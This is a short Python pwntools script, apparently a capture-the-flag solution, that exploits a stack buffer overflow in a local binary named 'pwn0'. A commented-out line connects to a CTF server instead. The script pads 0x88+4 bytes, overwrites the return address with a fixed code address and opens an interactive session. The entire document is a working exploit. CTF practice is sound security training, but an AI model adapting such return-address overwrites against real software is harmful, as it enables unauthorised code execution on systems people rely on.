from pwn import *

#p = connect('icewall-ctf.kr', 24000)
p = process('./pwn0')

payload = 'a' * (0x88 + 4)

payload += p32(0x8048514)

p.send(payload)

p.interactive()
